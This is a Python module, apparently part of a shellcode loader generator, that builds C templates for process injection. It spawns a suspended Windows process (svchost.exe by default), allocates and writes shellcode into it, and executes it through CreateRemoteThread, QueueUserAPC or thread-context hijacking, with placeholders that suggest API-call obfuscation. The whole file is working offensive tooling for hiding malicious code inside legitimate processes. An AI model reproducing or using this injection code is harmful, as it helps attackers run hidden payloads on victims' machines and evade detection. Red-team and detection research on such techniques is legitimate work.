from string import Template

from string import Template

class spawnandinject:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.apicallsList = ['CreateProcessA', 'WriteProcessMemory', 'VirtualAllocEx','CloseHandle']
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        self.execution = 'CreateRemoteThread'
        if 'execution' in arguments:
            self.execution = arguments['execution']
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
        if 'target' in arguments:
            self.target = arguments['target'].replace('\\','\\\\')

        if self.execution == 'CreateRemoteThread':
            self.executionCode = """
    HANDLE hThread = {CreateRemoteThread}(pi.hProcess, NULL, 0, pRemoteCode, NULL, 0, NULL);
    {WaitForSingleObject}(hThread, 500);
    {CloseHandle}(hThread);
    """
            self.apicallsList += ['CreateRemoteThread', 'WaitForSingleObject']
        elif self.execution == 'QueueUserAPC':
            self.executionCode = """
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)pRemoteCode;
    {QueueUserAPC}((PAPCFUNC)pRemoteCode, pi.hThread, (ULONG_PTR)NULL);
    {ResumeThread}(pi.hThread);
"""
            self.apicallsList += ['QueueUserAPC', 'ResumeThread']
        elif self.execution == 'SetThreadContext':
            self.executionCode = """
    CONTEXT ctx = {{ 0 }};
    ctx.ContextFlags = CONTEXT_CONTROL; // e.g., RIP/RSP/EBP
    if ({GetThreadContext}(pi.hThread, &ctx)) {{
        // Modify target register, e.g., ctx.Rip = newAddress;
        ctx.Rip = (DWORD64)pRemoteCode;
        {SetThreadContext}(pi.hThread, &ctx);
    }}
    {ResumeThread}(pi.hThread);
"""
            self.apicallsList += ['GetThreadContext', 'SetThreadContext', 'ResumeThread']

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>", 
                "#include <winternl.h>"]

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def apicalls(self) -> list[str]:
        return self.apicallsList

    def template(self) -> str:
        return Template("""
    {transformers}
    
    STARTUPINFOA si = {{
        sizeof(si)
    }}; 
    PROCESS_INFORMATION pi; 

    {CreateProcessA}(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    LPVOID pRemoteCode = {VirtualAllocEx}(pi.hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, $memoryPermission);
    {WriteProcessMemory}(pi.hProcess, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
    
    $execution
    {CloseHandle}(pi.hThread);
    {CloseHandle}(pi.hProcess);
""").substitute(target=self.target, memoryPermission=self.memoryPermission, execution=self.executionCode)